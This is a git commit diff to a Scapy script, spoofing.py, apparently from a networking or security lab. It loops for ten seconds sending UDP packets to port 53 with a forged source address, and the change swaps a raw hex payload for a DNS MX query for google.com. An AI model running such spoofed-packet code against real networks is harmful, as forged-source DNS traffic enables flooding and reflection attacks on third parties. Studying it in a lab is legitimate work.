ba1d1adf8e612f183ae7d8202e5adf7a11036920
nubi12336 <syislu62823@kaist.ac.kr>
2021-04-09 21:14:21 +0900

    d

--- spoofing.py
+++ spoofing.py
@@ -5,12 +5,9 @@ A= "192.168.30.1"
 B= "192.168.20.1"
 C= RandShort()
 D= 53
-
-data= ('32 ff 00 58 00 00 00 01 28 db 00 00 45 00 00 54 00 00 40 00 40 00')
-data_list= data.split(" ")
-data_s= ''.join(data_list).decode('hex')
+E= DNS(rd=1,qd=DNSQR(qname="google.com",qtype="MX"))
 
 start = time.time()
 while (time.time() - start < 10):
-    spoofed_packet = IP(src=A, dst=B) / UDP(sport=C, dport=D) / data_s
+    spoofed_packet = IP(src=A, dst=B) / UDP(sport=C, dport=D) / E
     send(spoofed_packet)
